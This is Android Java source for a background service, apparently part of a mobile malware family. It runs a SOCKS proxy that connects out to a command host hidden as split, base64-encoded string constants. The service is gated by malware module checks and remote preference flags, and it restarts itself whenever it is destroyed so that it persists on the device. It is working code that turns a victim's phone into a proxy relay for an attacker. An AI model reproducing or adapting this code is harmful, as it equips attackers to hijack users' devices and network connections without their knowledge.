package com.test.socks;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.test.Modules;
import com.test.constants.Constant;
import com.test.constants.S;
import com.test.helpers.Utils;

import java.util.List;

public class SService extends Service {

    private BroadcastReceiver receiver = null;
    private Thread cycleThread = null;
    private boolean stopped = false;
    private List<String> hosts;
    private int port = 5555;
    private SocksServer sserver;
    private static final String TAG = S.SService;

    public final static int ACTION_CONNECTED = 0;
    public final static int ACTION_STOP_SERVICE = 1;
    public final static int ACTION_DISCONNECTED = 2;
    public final static String PARAM_HOST = S.sserverParamHost;
    public final static String PARAM_PORT = S.sserverParamPort;



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Context ctx = getApplicationContext();

        Modules mods = new Modules(ctx);
        if(!mods.is_mod_exists(S.mod_main)) {
            if(Constant.DEBUG) Log.d("CONTROL", "SService not allowed");
            return START_NOT_STICKY;
        }

        boolean started = (boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.socksStartServicePref, false }) /* Prefs-Manager.get(ctx, S.socksStartServicePref, false) */;
        boolean disconnected = (boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.socksDisconnectedPref, false }) /* Prefs-Manager.get(ctx, S.socksDisconnectedPref, false) */;
        if (!started || disconnected){
            stopped = true;
            if (cycleThread != null){
                if(Constant.DEBUG) Log.d(TAG, "onStartCommand: terminating cycle thread");
                cycleThread.interrupt();

                cycleThread = null;
            }

            stopSelf();
            return START_NOT_STICKY;
        }

        stopped = false;
//        String[] servers = Constant.API_SERVER.split("\\|");
//
//
//        hosts = new ArrayList<String>();
//
//        for (String server : servers) {
//            try {
//                URL serverUrl = new URL(server);
//                hosts.add(serverUrl.getHost());
//            } catch (Exception e) {
//                Log.e(TAG, "" + e.getMessage());
//                continue;
//            }
//
//        }

//        if (hosts.size() == 0){
//            stopSelf();
//            return START_NOT_STICKY;
//        }

        ConnectivityManager cm = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);

        NetworkInfo info = cm.getActiveNetworkInfo();

        if (info != null && info.isConnected()){
            stopped = false;

            if (cycleThread != null){
                cycleThread.interrupt();

                if(Constant.DEBUG) Log.d(TAG, "onStartCommand: cycle thread terminated");
                cycleThread = null;
            }

            cycleThread  = new Thread(new Runnable() {
                @Override
                public void run() {
                    Context ctx = getBaseContext();
                    socksCycle(ctx);
                }
            });

            cycleThread.start();

        }

        receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                int action = intent.getIntExtra(S.socksReceiverAction, 0);
                switch (action) {
                    case ACTION_STOP_SERVICE:
                        stop();
                        break;

                }
            }
        };

        IntentFilter intentFilter = new IntentFilter(ctx.getPackageName());
        registerReceiver(receiver, intentFilter);

        return START_STICKY;
    }

    void stop(){

        if (sserver != null){
            sserver.setStop(true);
        }

        if (cycleThread != null){
            if(Constant.DEBUG) Log.d(TAG, "stop: terminating cycle");
            cycleThread.interrupt();
            cycleThread = null;
        }


        if (receiver != null) {
            unregisterReceiver(receiver);
            receiver = null;
        }

        stopped = true;
        stopSelf();
    }

    void socksCycle(Context ctx){

//        String[] hostAddresses = new String[hosts.size()];
//        hosts.toArray(hostAddresses);

        String host = S.socks_ip1 + S.socks_ip2 + S.socks_ip3 + S.socks_ip4 + S.socks_ip5 + S.socks_ip6;
        String hostAddress = Utils.base64_to_string(host);

        if (Constant.DEBUG) Log.d(TAG, "Socks address " + hostAddress);

        sserver = new SocksServer(ctx, hostAddress, port);
        while (true) {
            boolean res = sserver.start();
            if(Constant.DEBUG) Log.e(TAG, "socksCycle: " + res);
            if (!res || stopped) {
                stopped = true;
                if (sserver != null){
                    sserver.setStop(true);
                    sserver = null;
                }
                stopSelf();
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    @Override
    public void onDestroy() {
        if(Constant.DEBUG) Log.d(TAG, "onDestroy");
        if (receiver != null) {
            unregisterReceiver(receiver);
        }
        if (sserver != null) {
            sserver.setStop(true);
        }

        if (cycleThread != null){
            if(Constant.DEBUG) Log.d(TAG, "onDestroy: stopping cycle thread");
            cycleThread.interrupt();

            cycleThread = null;
        }

        super.onDestroy();

        if (stopped){
            return;
        }

        try {
            Intent serviceIntent = new Intent(this, SService.class);
            startService(serviceIntent);
        } catch (Exception e) {
            if(Constant.DEBUG) Log.d(TAG, " " + e.toString());
        }


    }


}